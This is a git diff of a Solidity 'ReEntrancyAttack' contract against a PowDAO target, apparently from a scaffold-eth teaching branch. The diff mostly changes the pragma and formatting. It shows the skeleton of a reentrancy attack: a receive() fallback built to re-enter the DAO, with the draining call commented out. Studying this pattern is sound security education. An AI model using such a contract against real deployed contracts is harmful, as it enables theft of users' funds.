@@ -1,6 +1,6 @@
 // Code snippets from scaffoth-eth reentrancy-ex branch
 
-pragma solidity >=0.6.0 <0.7.0;
+pragma solidity ^0.8.4;
 
 import "./PowDAO.sol";
 import "hardhat/console.sol";
@@ -10,11 +10,14 @@ contract ReEntrancyAttack {
     PowDAO powdao;
     bool hasAttacked;
 
-    constructor(address payable contractAddress) public { 
+    constructor(address payable contractAddress) public {
         hasAttacked = false;
         powdao = PowDAO(contractAddress);
         console.log(contractAddress.balance);
-        powdao.submitProposal(1*10**18, "Super important proposal, vote YES!");
+        powdao.submitProposal(
+            1 * 10**18,
+            "Super important proposal, vote YES!"
+        );
     }
 
     function withdraw() public {
@@ -23,12 +26,15 @@ contract ReEntrancyAttack {
     }
 
     function submitProposal() public {
-        powdao.submitProposal(1*10**18, "Super important proposal, vote YES!");
+        powdao.submitProposal(
+            1 * 10**18,
+            "Super important proposal, vote YES!"
+        );
     }
 
     receive() external payable {
         console.log("Not attacked yet with gas ", gasleft());
-        if(!hasAttacked){
+        if (!hasAttacked) {
             console.log("Withdrawing from powdao");
             //powdao.getPayoutUnsafe(address(this));
             hasAttacked = true;
